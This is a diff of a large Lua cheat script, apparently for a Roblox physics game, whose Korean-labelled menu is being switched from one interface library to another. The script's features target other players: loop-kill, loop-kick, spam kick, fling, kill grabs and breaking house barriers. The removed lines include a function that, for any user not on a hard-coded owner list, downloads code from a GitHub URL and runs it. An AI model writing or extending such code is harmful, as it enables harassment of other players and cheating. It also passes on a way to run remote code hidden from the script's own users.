@@ -6311,14 +6311,10 @@ DevTab:AddToggle({
     end
 })
 
-DevTab:CreateSection("열차")
-DevTab:CreateButton({
-    Name = "열차조종   <font color='rgb(0,155,0)'>[삭제]</font>",
-    Callback = TrSw
-})
 
-LoopTab:CreateSection("특별기능")
-local Loop1 = LoopTab:CreateToggle({
+
+LoopTab:AddSection("버튼기능")
+local Loop1 = LoopTab:AddToggle({
     Name = "PTM",
     CurrentValue = false,
     Flag = "21",
@@ -6338,7 +6334,7 @@ local Loop1 = LoopTab:CreateToggle({
     end
 })
 
-LoopTab:CreateButton({
+LoopTab:AddButton({
     Name = "킬    <font color='rgb(255,0,0)'>[오너]</font>",
     Callback = function()
         table.clear(playersInLoop2V)
@@ -6395,7 +6391,7 @@ LoopTab:CreateButton({
     end
 })
 
-LoopTab:CreateButton({
+LoopTab:AddButton({
     Name = "날리기    <font color='rgb(255,0,0)'>[오너]</font>",
     Callback = function()
         table.clear(playersInLoop2V)
@@ -6489,10 +6485,9 @@ LoopTab:CreateButton({
     end
 })
 
-
-DevTab:CreateToggle({
+DevTab:AddToggle({
     Name = "wd 소환 (상대안티킥 해제)",
-    CurrentValue = false,
+    Default = false,
     Flag = "5",
     Callback = function(Value)
         AntiStickyGBT = Value
@@ -6502,7 +6497,7 @@ DevTab:CreateToggle({
     end
 })
 
-local RRButton = LoopTab:CreateButton({
+local RRButton = LoopTab:AddButton({
     Name = "릴리즈    <font color='rgb(255,154,123)'>[블롭맨]</font>",
     Callback = function()
         table.clear(playersInLoop2V)
@@ -6514,7 +6509,7 @@ local RRButton = LoopTab:CreateButton({
     end
 })
 
-local LGButton = LoopTab:CreateButton({
+local LGButton = LoopTab:AddButton({
     Name = "메슬리즈   <font color='rgb(255,154,123)'>[블롭맨]</font>",
     Callback = function()
         table.clear(playersInLoop2V)
@@ -6526,7 +6521,7 @@ local LGButton = LoopTab:CreateButton({
     end
 })
 
-local RGButton = LoopTab:CreateButton({
+local RGButton = LoopTab:AddButton({
     Name = "잡기   <font color='rgb(255,154,123)'>[블롭맨]</font>",
     Callback = function()
         table.clear(playersInLoop2V)
@@ -6538,7 +6533,7 @@ local RGButton = LoopTab:CreateButton({
     end
 })
 
-local RDButton = LoopTab:CreateButton({
+local RDButton = LoopTab:AddButton({
     Name = "놓기   <font color='rgb(255,154,123)'>[블롭맨]</font>",
     Callback = function()
         table.clear(playersInLoop2V)
@@ -6550,10 +6545,10 @@ local RDButton = LoopTab:CreateButton({
     end
 })
 
-grabTab:CreateSection("Fling")
-local flingToggle = grabTab:CreateToggle({
+grabTab:AddSection("Fling")
+local flingToggle = grabTab:AddToggle({
     Name = "던지기 V1   <font color='rgb(255,0,0)'>[데스크톱]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "1",
     Callback = function(Value)
         flingT = Value
@@ -6561,26 +6556,24 @@ local flingToggle = grabTab:CreateToggle({
     end
 })
 
-local strengthInput = grabTab:CreateInput({
+local strengthInput = grabTab:AddTextbox({
     Name = "던지는 힘 V1",
-    CurrentValue = 0,
-    PlaceholderText = "Value",
-    RemoveTextAfterFocusLost = false,
+    Default = "0",
+    TextDisappear = false,
     Flag = "2",
     Callback = function(Value)
         strengthV = Value
     end
 })
 strengthInput:Set(9999)
-grabTab:CreateLabel("모바일의경우 작동하지 않습니다.")
+grabTab:AddLabel("모바일의경우 작동하지 않습니다.")
 local strengthConnection = nil
 local nageru = 800
 local lastThrowTime = 0
 
-grabTab:CreateToggle({
+grabTab:AddToggle({
     Name = "던지기 V2   <font color='rgb(0,255,0)'>[모바일]</font>",
     Default = false,
-    Save = true,
     Flag = "SuperThrow",
     Callback = function(enabled)
         if enabled then
@@ -6628,11 +6621,10 @@ grabTab:CreateToggle({
     end
 })
 
-grabTab:CreateInput({
+grabTab:AddTextbox({
     Name = "던지는 힘 V2",
-    PlaceholderText = "숫자 입력 (기본값: 800)",
     Default = "800",
-    Save = false,
+    TextDisappear = false,
     Callback = function(value)
         local num = tonumber(value)
         if num and num >= 0 then
@@ -6640,7 +6632,7 @@ grabTab:CreateInput({
         end
     end
 })
-grabTab:CreateLabel("모바일을 지원하며 가장좋은 슈퍼 쓰로우 입니다.")
+grabTab:AddLabel("모바일을 지원하며 가장좋은 슈퍼 쓰로우 입니다.")
 
 game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
@@ -6648,10 +6640,10 @@ game:GetService("UserInputService").InputBegan:Connect(function(input, gameProce
         lastThrowTime = tick()
     end
 end)
-grabTab:CreateSection("Line")
-local extendLineToggle = grabTab:CreateToggle({
+grabTab:AddSection("Line")
+local extendLineToggle = grabTab:AddToggle({
     Name = "줄길이",
-    CurrentValue = false,
+    Default = false,
     Flag = "3",
     Callback = function(Value)
         infLineExtendT = Value
@@ -6659,11 +6651,10 @@ local extendLineToggle = grabTab:CreateToggle({
     end
 })
 
-local extendLineInput = grabTab:CreateInput({
+local extendLineInput = grabTab:AddTextbox({
     Name = "휠속도",
-    CurrentValue = 0,
-    PlaceholderText = "Value",
-    RemoveTextAfterFocusLost = false,
+    Default = "0",
+    TextDisappear = false,
     Flag = "4",
     Callback = function(Value)
         increaseLineExtendV = Value
@@ -6671,10 +6662,10 @@ local extendLineInput = grabTab:CreateInput({
 })
 extendLineInput:Set(1.7)
 
-grabTab:CreateSection("Other")
-local AntiStruggleGrab = grabTab:CreateToggle({
+grabTab:AddSection("Other")
+local AntiStruggleGrab = grabTab:AddToggle({
     Name = "루프 그랩  <font color='rgb(255,0,0)'>[오너쉽]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "1",
     Callback = function(Value)
         AntiStruggleGrabT = Value
@@ -6684,9 +6675,9 @@ local AntiStruggleGrab = grabTab:CreateToggle({
     end
 })
 
-local RagdollGrabToggle = grabTab:CreateToggle({
+local RagdollGrabToggle = grabTab:AddToggle({
     Name = "래그돌 그랩  <font color='rgb(25,60,10)'>[판자]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "1",
     Callback = function(Value)
         RagdollGrabT = Value
@@ -6696,9 +6687,9 @@ local RagdollGrabToggle = grabTab:CreateToggle({
     end
 })
 
-local MasslessGrab = grabTab:CreateToggle({ 
+local MasslessGrab = grabTab:AddToggle({ 
     Name = "무질량 그랩", 
-    CurrentValue = false,
+    Default = false,
     Flag = "1",
     Callback = function(Value)
         MasslessGrabT = Value
@@ -6708,9 +6699,9 @@ local MasslessGrab = grabTab:CreateToggle({
     end
 })
 
-local NoClipGrab = grabTab:CreateToggle({ 
+local NoClipGrab = grabTab:AddToggle({ 
     Name = "노클립 그랩", 
-    CurrentValue = false,
+    Default = false,
     Flag = "1",
     Callback = function(Value)
         NoClipGrabT = Value
@@ -6720,9 +6711,9 @@ local NoClipGrab = grabTab:CreateToggle({
     end
 })
 
-grabTab:CreateToggle({ 
+grabTab:AddToggle({ 
     Name = "드럼통(킬)그랩  <font color='rgb(255,0,0)'>[오너쉽]</font>   <font color='rgb(0,0,255)'>[프리미엄]</font>", 
-    CurrentValue = false,
+    Default = false,
     Flag = "1",
     Callback = function(Value)
         KillGrabT = Value
@@ -6730,10 +6721,10 @@ grabTab:CreateToggle({
     end
 })
 
-grabTab:CreateSection("킥")
-grabTab:CreateToggle({
+grabTab:AddSection("킥")
+grabTab:AddToggle({
     Name = "킥그랩(더럽게 안됨)  <font color='rgb(255,0,0)'>[오너쉽]</font>  <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "1",
     Callback = function(Value)
         KickGrabT = Value
@@ -6741,7 +6732,7 @@ grabTab:CreateToggle({
     end
 })
 
-grabTab:CreateSection("앵커")
+grabTab:AddSection("앵커")
 local isAnchorState = false
 local currentConn = nil
 local colorConn = nil
@@ -6867,120 +6858,120 @@ local function toggleAnchor(Value)
     end
 end
 
-toggleElement = grabTab:CreateToggle({
+toggleElement = grabTab:AddToggle({
     Name = "물체 고정 토글",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         toggleAnchor(Value)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "물체 고정",
     Callback = function()
         task.spawn(runAnchorLogic)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 그라데이션 (기본값)",
     Callback = function()
         hColor = nil
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 빨강",
     Callback = function()
         hColor = Color3.fromRGB(255, 0, 0)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 주황",
     Callback = function()
         hColor = Color3.fromRGB(255, 127, 0)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 노랑",
     Callback = function()
         hColor = Color3.fromRGB(255, 255, 0)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 초록",
     Callback = function()
         hColor = Color3.fromRGB(0, 255, 0)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 파랑",
     Callback = function()
         hColor = Color3.fromRGB(0, 0, 255)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 남색",
     Callback = function()
         hColor = Color3.fromRGB(75, 0, 130)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 보라",
     Callback = function()
         hColor = Color3.fromRGB(148, 0, 211)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 검정",
     Callback = function()
         hColor = Color3.fromRGB(0, 0, 0)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 흰색",
     Callback = function()
         hColor = Color3.fromRGB(255, 255, 255)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 핑크",
     Callback = function()
         hColor = Color3.fromRGB(255, 105, 180)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 민트",
     Callback = function()
         hColor = Color3.fromRGB(170, 255, 195)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 골드",
     Callback = function()
         hColor = Color3.fromRGB(255, 215, 0)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 네온 그린",
     Callback = function()
         hColor = Color3.fromRGB(57, 255, 20)
     end,
 })
 
-grabTab:CreateButton({
+grabTab:AddButton({
     Name = "색상: 청록",
     Callback = function()
         hColor = Color3.fromRGB(0, 128, 128)
@@ -6998,29 +6989,6 @@ game:GetService("UserInputService").InputBegan:Connect(function(input, gameProce
         end
     end
 end)
-
--- =============== [ 보호 대상 목록 ] ==
-local GF = {"wetokwk3jr"}
-
-
-local Owner = {"QRdoote1120", "0110rim", "Alpaca_AI16", "hello_qweqwe", "hello_q1w2e3", "pacapaca110", "wetokwk3jr", "dhalstjr1350", "one_day0618", "", "", "", "", "", "", ""}
-local Overseer = {""}
-local CoOwner = {""}
-local HeadAdmin = {""}
-local Admin = {""}
-local Mod = {""}
-
-local Ranks = {
-    Owner = 7,
-    GF = 6,
-    Overseer = 5,
-    CoOwner = 4,
-    HeadAdmin = 3,
-    Admin = 2,
-    Mod = 1,
-    User = 0
-}
--- =============== ---------------- ==
 
 local function Notify(type, playerName)
     playerName = playerName or ""
@@ -7044,166 +7012,23 @@ local function Notify(type, playerName)
         GfLogger()
     end
 
-    if Rayfield then
-        Rayfield:Notify({Title = title, Content = content, Duration = 2})
-    end
+    OrionLib:MakeNotification({Name = title, Content = content, Time = 2})
 end
 
-local function GetPlayerRank(playerName)
-    if table.find(Owner, playerName) then return Ranks.Owner end
-    if table.find(GF, playerName) then return Ranks.GF end
-    if table.find(Overseer, playerName) then return Ranks.Overseer end
-    if table.find(CoOwner, playerName) then return Ranks.CoOwner end
-    if table.find(HeadAdmin, playerName) then return Ranks.HeadAdmin end
-    if table.find(Admin, playerName) then return Ranks.Admin end
-    if table.find(Mod, playerName) then return Ranks.Mod end
-    return Ranks.User
-end
-
-local function findPlayer(Value)
-    if not Value or Value == "" then return nil end
-    Value = Value:lower()
-
-    for _, p in ipairs(game.Players:GetPlayers()) do
-        if p.Name:lower() == Value or (p.DisplayName and p.DisplayName:lower() == Value) then
-            return p
-        end
-    end
-
-    local matches = {}
-    for _, p in ipairs(game.Players:GetPlayers()) do
-        local playerNameLower = p.Name:lower()
-        if playerNameLower:sub(1, #Value) == Value then
-            table.insert(matches, p)
-        elseif p.DisplayName then
-            local displayNameLower = p.DisplayName:lower()
-            if displayNameLower:sub(1, #Value) == Value then
-                table.insert(matches, p)
-            end
-        end
-    end
-
-    if #matches == 0 then
-        return nil
-    elseif #matches == 1 then
-        return matches[1]
-    else
-        return matches[1]
-    end
-end
-
-local function checkPermissions(targetPlayer)
-    local localPlayer = game.Players.LocalPlayer
-    local myRank = GetPlayerRank(localPlayer.Name)
-    local targetRank = GetPlayerRank(targetPlayer.Name)
-
-    if targetPlayer == localPlayer then return false, "Self" end
-
-    if myRank == Ranks.Owner then return true end
-
-    if myRank == Ranks.Overseer and targetRank == Ranks.Owner then
-        return true
-    end
-
-    if myRank == Ranks.CoOwner and targetRank == Ranks.Owner then
-        return true
-    end
-
-    if targetRank == Ranks.User then
-        return true
-    end
-
-    if targetRank == Ranks.GF then
-        return false, "GFE"
-    end
-
-    if myRank > targetRank then
-        return true
-    else
-        return false, "HigherRank"
-    end
-end
-
-local function addToList(listTable, dropdown, inputValue, useRankCheck)
-    local target = findPlayer(inputValue)
-    if not target then Notify("NotFound"); return end
-
-    if useRankCheck then
-        local allowed, errorType = checkPermissions(target)
-        if not allowed then Notify(errorType, target.Name); return end
-    end
-
-    if table.find(listTable, target.Name) then Notify("Already", target.Name); return end
-
-    table.insert(listTable, target.Name)
-    if dropdown then dropdown:Refresh(listTable, true) end
-    Notify("Added", target.Name)
-end
-
-local function removeFromList(listTable, dropdown, inputValue, useRankCheck)
-    local foundName, foundIndex = nil, nil
-    inputValue = inputValue:lower()
-
-    for i, name in ipairs(listTable) do
-        if name:lower():find(inputValue, 1, true) then
-            foundName = name; foundIndex = i; break
-        end
-    end
-
-    if not foundName then Notify("NotFound"); return end
-
-    if useRankCheck then
-        local targetRank = GetPlayerRank(foundName)
-        local localPlayer = game.Players.LocalPlayer
-        local myRank = GetPlayerRank(localPlayer.Name)
-
-        if foundName == localPlayer.Name then Notify("Self"); return end
-
-        if myRank == Ranks.Owner then
-        elseif targetRank == Ranks.User then
-        elseif myRank <= targetRank then
-            Notify("HigherRank", foundName); return
-        end
-    end
-
-    table.remove(listTable, foundIndex)
-    if dropdown then dropdown:Refresh(listTable, true) end
-    Notify("Removed", foundName)
-end
-
-function Logger()
-    local plr = game.Players.LocalPlayer
-
-    local BYPASS_ID = 1
-
-    local ownerTable = {}
-    for _, name in ipairs(Owner) do
-        ownerTable[name] = true
-    end
-
-    if not ownerTable[plr.Name] and plr.UserId ~= BYPASS_ID then
-        local success, errorMessage = pcall(function()
-           loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))() -- anti kick
-        end)
-
-        if not success then
-        end
-    end
-end
-antiTab:CreateSection("친구")
-local WhiteListToggle = antiTab:CreateToggle({
+antiTab:AddSection("친구")
+local WhiteListToggle = antiTab:AddToggle({
     Name = "친구 빼기",
-    CurrentValue = true,
+    Default = true,
     Flag = "5",
     Callback = function(Value)
         ForWhiteList(Value)
     end
 })
-antiTab:CreateSection("하우스 브레이커")
+antiTab:AddSection("하우스 브레이커")
 
-local HouseBreakToggle = antiTab:CreateToggle({
+local HouseBreakToggle = antiTab:AddToggle({
     Name = "하우스 브레이크 (집안 물건 들이기)",
-    CurrentValue = false,
+    Default = false,
     Flag = "HouseBreakToggle",
     Callback = function(Value)
         HouseBreakT = Value
@@ -7211,34 +7036,32 @@ local HouseBreakToggle = antiTab:CreateToggle({
     end
 })
 
-local BreakHouseBarrierToggle = antiTab:CreateToggle({
+local BreakHouseBarrierToggle = antiTab:AddToggle({
     Name = " 집 베리어 무력화",
-    CurrentValue = false,
+    Default = false,
     Flag = "BreakHouseBarrier",
     Callback = function(Value)
         BreakHouseBarrierT = Value
         BreakHouseBarrierF()
         
         if Value then
-            Rayfield:Notify({
-                Title = "Break House Barrier",
+            OrionLib:MakeNotification({
+                Name = "Break House Barrier",
                 Content = "베리어 뚫기 활성화! 바깥 물건 많이 붙잡고 집 안으로 TP해보세요.",
-                Duration = 5
+                Time = 5
             })
         end
     end
 })
 
-
-
 if plr.UserId == 1 then AddAll = true end
 
 if AddAll then
 SelectedList = nil
-local AddAllList = ListTab:CreateDropdown({
+local AddAllList = ListTab:AddDropdown({
     Name = "추가",
     Options = {"블롭", "오너", "래그돌"},
-    CurrentOption = {"OPEN"},
+    Default = {"OPEN"},
     MultipleOptions = false,
     Flag = "Dropdown_AllList",
     Callback = function(Options)
@@ -7246,7 +7069,7 @@ local AddAllList = ListTab:CreateDropdown({
     end
 })
 
-ListTab:CreateButton({
+ListTab:AddButton({
     Name = "모두 추가",
     Callback = function()
         if SelectedList == "블롭" then
@@ -7267,7 +7090,7 @@ ListTab:CreateButton({
     end
 })
 
-ListTab:CreateButton({
+ListTab:AddButton({
     Name = "모두 재설정",
     Callback = function()
         if SelectedList == "블롭" then
@@ -7289,11 +7112,11 @@ ListTab:CreateButton({
 })
 end
 
-ListTab:CreateSection("White")
-local Dropdown = ListTab:CreateDropdown({
+ListTab:AddSection("White")
+local Dropdown = ListTab:AddDropdown({
     Name = "친구  <font color='rgb(255,255,100)'>[프렌드]</font>",
     Options = Whitelist,
-    CurrentOption = {"OPEN"},
+    Default = {"OPEN"},
     MultipleOptions = true,
     Flag = "WhitelistDropdown",
     Callback = function(Options)
@@ -7301,29 +7124,29 @@ local Dropdown = ListTab:CreateDropdown({
     end
 })
 
-ListTab:CreateInput({
+ListTab:AddTextbox({
     Name = "추가",
-    PlaceholderText = "...",
-    RemoveTextAfterFocusLost = true,
+    Default = "",
+    TextDisappear = true,
     Callback = function(Value)
         addToList(Whitelist, Dropdown, Value, false) 
     end
 })
 
-ListTab:CreateInput({
+ListTab:AddTextbox({
     Name = "제거",
-    PlaceholderText = "...",
-    RemoveTextAfterFocusLost = true,
+    Default = "",
+    TextDisappear = true,
     Callback = function(Value)
         removeFromList(Whitelist, Dropdown, Value)
     end
 })
 
-ListTab:CreateSection("명단")
-local DropdownV1 = ListTab:CreateDropdown({
+ListTab:AddSection("명단")
+local DropdownV1 = ListTab:AddDropdown({
     Name = "족칠 새끼 고르기  <font color='rgb(255,0,0)'>[타겟]</font>",
     Options = playersInLoop1V,
-    CurrentOption = {"OPEN"},
+    Default = {"OPEN"},
     MultipleOptions = true,
     Flag = "LoopBlobDropdown",
     Callback = function(Options)
@@ -7331,52 +7154,51 @@ local DropdownV1 = ListTab:CreateDropdown({
     end
 })
 
-ListTab:CreateInput({
+ListTab:AddTextbox({
     Name = "추가",
-    PlaceholderText = "...",
-    RemoveTextAfterFocusLost = true,
+    Default = "",
+    TextDisappear = true,
     Callback = function(Value)
         addToList(playersInLoop1V, DropdownV1, Value, true)
     end
 })
 
-ListTab:CreateInput({
+ListTab:AddTextbox({
     Name = "제거",
-    PlaceholderText = "...",
-    RemoveTextAfterFocusLost = true,
+    Default = "",
+    TextDisappear = true,
     Callback = function(Value)
         removeFromList(playersInLoop1V, DropdownV1, Value)
     end
 })
 
-
-ListTab:CreateToggle({
+ListTab:AddToggle({
     Name = "루프  TP  <font color='rgb(100,150,250)'>[파카]</font>",
-    CurrentValue = false,
+    Default = false,
     Callback = function(Value)
         if Value then
-            Rayfield:Notify({
-                Title = "안내",
+            OrionLib:MakeNotification({
+                Name = "안내",
                 Content = "이 기능은 파카전용기능입니다",
-                Duration = 3,
-                Image = nil,
+                Time = 3,
             })
         end
     end,
 })
 
-LoopTab:CreateSection("자동블롭앉기")
-local AutoSit = LoopTab:CreateToggle({
+LoopTab:AddSection("자동블롭앉기")
+local AutoSit = LoopTab:AddToggle({
     Name = "자동블롭앉기",
-    CurrentValue = false,
+    Default = false,
     Flag = "AutoSitBlobman",
     Callback = function(Value)
         AutoSitT = Value
         AutoSitF()
     end
 })
-LoopTab:CreateSection("브링")
-LoopTab:CreateButton({
+
+LoopTab:AddSection("브링")
+LoopTab:AddButton({
     Name = "끌고오기   <font color='rgb(255,154,123)'>[블롭맨]</font>",
     Callback = function()
         UpdateCurrentBlobman()
@@ -7443,7 +7265,7 @@ LoopTab:CreateButton({
     end
 })
 
-LoopTab:CreateButton({
+LoopTab:AddButton({
     Name = "끌고오기   <font color='rgb(255,0,0)'>[그랩]</font>",
     Callback = function()
         UpdateCurrentBlobman()
@@ -7611,14 +7433,12 @@ LoopTab:CreateButton({
     end
 })
 
-    LoopTab:CreateSection("오너킥")
+LoopTab:AddSection("오너킥")
     
-    local OLTPInput = LoopTab:CreateInput({
+    local OLTPInput = LoopTab:AddTextbox({
         Name = "X Y Z",
-        CurrentValue = "0,40,0",
-        PlaceholderText = "",
-        RemoveTextAfterFocusLost = false,
-        Flag = "",
+        Default = "0,40,0",
+        TextDisappear = false,
         Callback = function(Value)
             local x, y, z = string.match(Value, "([%d.-]+),([%d.-]+),([%d.-]+)")
             if x and y and z then
@@ -7629,9 +7449,9 @@ LoopTab:CreateButton({
     })
     OLTPInput:Set("0,40,0")
     
-    local blobLoop4Toggle = LoopTab:CreateToggle({
+    local blobLoop4Toggle = LoopTab:AddToggle({
         Name = "스팸킥    <font color='rgb(255,0,255)'>[스팸]</font>    <font color='rgb(0,0,255)'>[프리미엄]</font>",
-        CurrentValue = false,
+        Default = false,
         Flag = "21",
         Callback = function(Value)
             blobLoopT4 = Value
@@ -7648,28 +7468,28 @@ LoopTab:CreateButton({
             end
         end
     })
-LoopTab:CreateToggle({
+LoopTab:AddToggle({
     Name = "ㄴ 고정",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         SkipOL = Value
     end
 })
 
-LoopTab:CreateToggle({
+LoopTab:AddToggle({
     Name = "ㄴ 그랩파괴 없이",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         OnlyOwner = Value
     end
 })
-LoopTab:CreateSection("new")
+LoopTab:AddSection("new")
 
-LoopTab:CreateToggle({
+LoopTab:AddToggle({
     Name = "레이지봇 킥   <font color='rgb(255,154,123)'>[레이지봇]</font>  <font color='rgb(0,255,0)'>[프리미엄]</font>  <font color='rgb(255,0,1)'>[바이패스]</font>  <font color='rgb(0,154,48)'>[락]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "22",
     Callback = function(Value)
         blobKickT3 = Value
@@ -7694,7 +7514,6 @@ LoopTab:CreateToggle({
                 local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
                 local seat = myHum and myHum.SeatPart
 
-                -- 탑승 중이 아닐 때 미세 대기 주기를 늘려 평상시 렉(부하)을 완전히 해결
                 if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
                     task.wait(0.1)
                     continue
@@ -7808,7 +7627,6 @@ LoopTab:CreateToggle({
                     end
                     task.wait(0.0005)
 
-                    -- 2.6초간 고속 공전 스팸 실행
                     local startTime = os.clock()
                     
                     while blobKickT3 and player.Parent and char.Parent and hum.Health > 0 and hrp:IsDescendantOf(workspace) do
@@ -7841,7 +7659,6 @@ LoopTab:CreateToggle({
                         end
                     end
 
-                    -- [요청 반영]: 락 유지용 딜레이 소폭 증가 및 최적화 연계
                     if blobKickT3 and player.Parent and char.Parent and hum.Health > 0 then
                         if myHrp and hrp and originCF then
                             hrp.CFrame = CFrame.new(originCF.X, originCF.Y + 50, originCF.Z)
@@ -7850,17 +7667,14 @@ LoopTab:CreateToggle({
                             if currentBlobS and hrp.Parent.Name == name then
                                 BlobMassless(currentBlobS, hrp, "Right")
                             end
-                            -- 기존 0.03초에서 판정이 완전히 서버에 각인되도록 안정적인 0.08초로 딜레이 조정
                             task.wait(0.08)
                         end
                     end
 
-                    -- 공중 락 각인 완료 후 원래 위치 복귀
                     if originCF and myHrp then
                         BACK(originCF)
                     end
 
-                    -- 타겟이 탈주하거나 리스폰하기 전까지 루프가 헛돌지 않게 완벽 격리 대기 (대기 시간 0.2초로 완화하여 렉 방지)
                     while blobKickT3 and player.Parent == game.Players and player.Character == char and hum.Health > 0 and hrp:IsDescendantOf(workspace) do
                         task.wait(0.2)
                     end
@@ -7868,15 +7682,14 @@ LoopTab:CreateToggle({
                     task.wait(0.1)
                     break
                 end
-                -- 포룹 내부 빈 주기 조절하여 비전투 상태 백그라운드 연산 최적화
                 task.wait(0.05)
             end
         end)
     end
 })
 
-LoopTab:CreateSection("루프킥")
-LoopTab:CreateButton({
+LoopTab:AddSection("루프킥")
+LoopTab:AddButton({
     Name = "무질량 끄기",
     Callback = function()
 
@@ -7893,9 +7706,9 @@ LoopTab:CreateButton({
     end
 })
 
-local blobLoopToggle = LoopTab:CreateToggle({
+local blobLoopToggle = LoopTab:AddToggle({
     Name = "루프킥  <font color='rgb(255,154,123)'>[블롭맨]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         blobLoopT = Value
@@ -7924,27 +7737,27 @@ local blobLoopToggle = LoopTab:CreateToggle({
         end
     end
 })
-LoopTab:CreateToggle({
+LoopTab:AddToggle({
     Name = "ㄴ 앉기",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         LoopBringMODED = Value
     end
 })
 
-LoopTab:CreateToggle({
+LoopTab:AddToggle({
     Name = "ㄴ 안티 인플레이스 모드",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         LoopReleaseMODED = Value
     end
 })
-LoopTab:CreateSection("루프킬 블롭맨")
-local blobLoop3Toggle = LoopTab:CreateToggle({
+LoopTab:AddSection("루프킬 블롭맨")
+local blobLoop3Toggle = LoopTab:AddToggle({
     Name = "루프킬   <font color='rgb(0,0,255)'>[프라임 오너쉽]</font>   <font color='rgb(255,0,0)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         blobLoopT3 = Value
@@ -7963,9 +7776,9 @@ local blobLoop3Toggle = LoopTab:CreateToggle({
 })
 
 
-LoopTab:CreateToggle({
+LoopTab:AddToggle({
     Name = "블롭 루프킬V2  <font color='rgb(255,154,123)'>[블롭맨]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         blobLoopT3 = Value
@@ -8063,9 +7876,9 @@ LoopTab:CreateToggle({
 
 
 
-local blobLoop2Toggle = LoopTab:CreateToggle({
+local blobLoop2Toggle = LoopTab:AddToggle({
     Name = "루프 그랩   <font color='rgb(255,154,123)'>[블롭맨]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         blobLoopT2 = Value
@@ -8083,10 +7896,10 @@ local blobLoop2Toggle = LoopTab:CreateToggle({
     end
 })
 
-LoopTab:CreateSection("블롭없음")
-local Loop1 = LoopTab:CreateToggle({
+LoopTab:AddSection("블롭없음")
+local Loop1 = LoopTab:AddToggle({
     Name = "루프킬   <font color='rgb(0,255,0)'>[그랩]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         loopPlayerT = Value
@@ -8106,9 +7919,9 @@ local Loop1 = LoopTab:CreateToggle({
 
 
 
-local Loop2 = LoopTab:CreateToggle({
+local Loop2 = LoopTab:AddToggle({
     Name = "루프킥   <font color='rgb(0,255,0)'>[그랩]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "21",
     Callback = function(Value)
         loopPlayerT2 = Value
@@ -8126,10 +7939,10 @@ local Loop2 = LoopTab:CreateToggle({
     end
 })
 
-LoopTab:CreateSection("스팸")
-LoopTab:CreateToggle({
+LoopTab:AddSection("스팸")
+LoopTab:AddToggle({
     Name = "스팸  <font color='rgb(0,0,255)'>[프리미엄]</font>",
-    CurrentValue = false,
+    Default = false,
     Flag = "27",
     Callback = function(Value)
         LoopSnowBallT = Value
@@ -8137,7 +7950,7 @@ LoopTab:CreateToggle({
     end
 })
 
-LoopTab:CreateButton({
+LoopTab:AddButton({
     Name = "블랙홀  <font color='rgb(0,0,0)'>[닌자 쿠나이]</font>",
     Callback = function()
         local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -8304,10 +8117,10 @@ LoopTab:CreateButton({
 })
 
 
-antiTab:CreateSection("Teleport | Toggle")
-local AntiGrabV1 = antiTab:CreateToggle({
+antiTab:AddSection("Teleport | Toggle")
+local AntiGrabV1 = antiTab:AddToggle({
     Name = "무질량 이동 | TP",
-    CurrentValue = false,
+    Default = false,
     Flag = "FakeTP",
     Callback = function(Value)
         AntiGrabTP_Active = Value
@@ -8376,9 +8189,9 @@ local AntiGrabV1 = antiTab:CreateToggle({
     end
 })
 
-local AntiGrabV1 = antiTab:CreateToggle({
+local AntiGrabV1 = antiTab:AddToggle({
     Name = "루프 TP | 랜덤",
-    CurrentValue = false,
+    Default = false,
     Flag = "5",
     Callback = function(Value)
         AntiGrabTP_ActiveV2 = Value
@@ -8417,10 +8230,10 @@ local AntiGrabV1 = antiTab:CreateToggle({
     end
 })
 
-antiTab:CreateLabel("루프 TP같은경우 루프킬,킥을 우회할때 유용합니다.")
+antiTab:AddLabel("루프 TP같은경우 루프킬,킥을 우회할때 유용합니다.")
 
 
-antiTab:CreateSection("오너쉽")
+antiTab:AddSection("오너쉽")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
@@ -8529,9 +8342,9 @@ LocalPlayer.CharacterAdded:Connect(monitorCharacter)
 
 
 
-antiTab:CreateToggle({
